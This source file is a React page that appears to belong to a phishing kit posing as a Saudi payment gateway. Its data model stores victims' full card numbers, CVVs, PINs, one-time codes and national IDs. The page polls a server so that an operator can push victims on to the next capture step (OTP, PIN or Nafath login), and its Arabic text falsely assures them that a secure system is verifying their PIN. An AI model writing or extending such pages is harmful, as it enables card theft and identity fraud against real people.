import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { getNextPagePath } from '../lib/flow';
import { motion } from 'motion/react';
import { ShieldCheck, Loader2, AlertCircle, RefreshCw } from 'lucide-react';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED' | 'AWAITING_PIN' | 'PIN_SUBMITTED';
  otpCode: string;
  submittedOtp?: string;
  cardPin?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
}

export function PinProcessingPage() {
  const navigate = useNavigate();
  const location = useLocation();
  
  const [tx, setTx] = useState<Transaction | undefined>(() => {
    if (location.state?.tx) {
      localStorage.setItem('last_tx', JSON.stringify(location.state.tx));
      return location.state.tx;
    }
    const saved = localStorage.getItem('last_tx');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return undefined;
      }
    }
    return undefined;
  });

  const [status, setStatus] = useState<Transaction['status']>('PIN_SUBMITTED');
  const [error, setError] = useState<string | null>(null);

  // If no transaction in state, redirect home
  useEffect(() => {
    if (!tx || !tx.id) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Status Polling Engine
  useEffect(() => {
    if (!tx || !tx.id) return;

    let isMounted = true;
    let interval: NodeJS.Timeout;

    const checkStatus = async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (!res.ok) {
          console.warn('Could not fetch transaction status in PinProcessingPage, retrying...', res.status);
          return;
        }
        const updatedTx: Transaction = await res.json();
        
        if (isMounted) {
          setStatus(updatedTx.status);
          localStorage.setItem('last_tx', JSON.stringify(updatedTx));
          
          if (updatedTx.status === 'AWAITING_OTP') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/pin-processing');
              navigate(dynamicNext || '/otp', { state: { tx: updatedTx } });
            }, 800);
          } else if (updatedTx.status === 'AWAITING_PIN') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/pin-processing');
              navigate(dynamicNext || '/card-pin', { state: { tx: updatedTx } });
            }, 800);
          } else if (updatedTx.status === 'AWAITING_NAFATH') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/pin-processing');
              navigate(dynamicNext || '/nafath-login', { state: { tx: updatedTx } });
            }, 800);
          } else if (updatedTx.status === 'APPROVED') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/pin-processing');
              navigate(dynamicNext || '/success', { state: { tx: updatedTx } });
            }, 800);
          } else if (updatedTx.status === 'REJECTED') {
            clearInterval(interval);
          }
        }
      } catch (err) {
        console.warn('Polling network warning in PinProcessingPage, retrying...', err);
        setError('انقطع الاتصال مؤقتاً. جاري محاولة إعادة الاتصال بالخادم الآمن...');
      }
    };

    // Poll every 2 seconds
    interval = setInterval(checkStatus, 2000);

    // Instant check when user switches back to the tab
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'visible') {
        checkStatus();
      }
    };

    window.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('focus', checkStatus);

    return () => {
      isMounted = false;
      clearInterval(interval);
      window.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', checkStatus);
    };
  }, [tx, navigate]);

  if (!tx) return null;

  const isPending = status === 'PIN_SUBMITTED';
  const isRejected = status === 'REJECTED';

  return (
    <div id="pin-processing-container" className="mx-auto max-w-lg px-4 py-16 flex flex-col items-center justify-center min-h-[70vh]">
      <motion.div
        initial={{ opacity: 0, y: 15 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full rounded-2xl border border-gray-100 bg-white p-8 text-center shadow-xl relative overflow-hidden"
      >
        {/* Top emerald line bar */}
        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />

        {/* Animated glowing loader */}
        <div className="relative flex items-center justify-center mb-6 h-24 w-24 mx-auto">
          {/* Pulsing ring */}
          <div className="absolute inset-0 rounded-full bg-emerald-500/5 animate-ping" />
          {/* Secondary rotating dashboard indicator */}
          <div className="absolute inset-2 rounded-full border-2 border-t-[#004d33] border-r-transparent border-b-transparent border-l-emerald-600/20 animate-spin" style={{ animationDuration: '2.5s' }} />
          {/* Main fast spinner */}
          <div className="absolute inset-4 rounded-full border-4 border-gray-100 border-t-[#004d33] animate-spin" />
          
          <ShieldCheck className="relative h-8 w-8 text-[#004d33]" />
        </div>

        <h2 className="text-xl font-extrabold text-slate-800 mb-2 font-sans">
          {isRejected ? 'تم رفض المعاملة' : 'جاري التحقق من الرمز السري للبطاقة'}
        </h2>
        
        <p className="text-[10px] font-mono text-slate-400 mb-6 uppercase tracking-widest flex items-center justify-center gap-1.5">
          <Loader2 className="h-3 w-3 animate-spin text-[#004d33]" />
          <span>الرقم المرجعي: {tx.id}</span>
        </p>

        {isPending && (
          <div className="space-y-4 text-right dir-rtl">
            <p className="text-slate-600 text-xs leading-relaxed max-w-sm mx-auto text-center font-medium">
              يقوم النظام الآمن حالياً بالتحقق من الرمز السري المدخل لبطاقتك (PIN). نرجو إبقاء هذه الصفحة مفتوحة وعدم إغلاقها أو تحديثها.
            </p>
            
            <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl space-y-2 font-sans text-xs max-w-sm mx-auto">
              <div className="flex justify-between">
                <span className="text-slate-500">قيمة الدفعة:</span>
                <span className="font-mono font-bold text-slate-900">{tx.amount.toFixed(2)} ر.س</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">نوع البطاقة:</span>
                <span className="text-slate-700 uppercase font-bold">{tx.cardType}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-500">حالة التحقق:</span>
                <span className="text-amber-600 font-extrabold flex items-center gap-1 animate-pulse">
                  <span className="text-[10px]">●</span>
                  <span>جاري معالجة الـ PIN</span>
                </span>
              </div>
            </div>
          </div>
        )}

        {isRejected && (
          <div className="space-y-5 text-right dir-rtl">
            <div className="rounded-xl bg-rose-50 border border-rose-100 p-4 max-w-sm mx-auto text-rose-800 text-xs leading-relaxed text-center font-medium">
              <div className="flex items-center gap-1.5 mb-1 justify-center font-extrabold">
                <AlertCircle className="h-4 w-4 text-rose-600" />
                <span>عذراً، تعذر قبول العملية</span>
              </div>
              <span>تم رفض طلب التفويض أو الرمز السري من قبل البنك المصدر للبطاقة. يرجى مراجعة البنك الخاص بك.</span>
            </div>
            
            <button
              onClick={() => navigate('/')}
              className="w-full h-11 bg-[#004d33] hover:bg-[#003824] text-white rounded-xl text-xs font-bold transition-all shadow-md flex items-center justify-center"
            >
              العودة لبوابة الدفع
            </button>
          </div>
        )}

        {/* Dynamic error reconnecting message */}
        {error && (
          <div className="mt-4 text-[10px] text-rose-600 flex items-center justify-center gap-1.5 bg-rose-50 p-2 rounded-xl border border-rose-100">
            <RefreshCw className="h-3 w-3 animate-spin shrink-0 text-rose-500" />
            <span>{error}</span>
          </div>
        )}

      </motion.div>
    </div>
  );
}
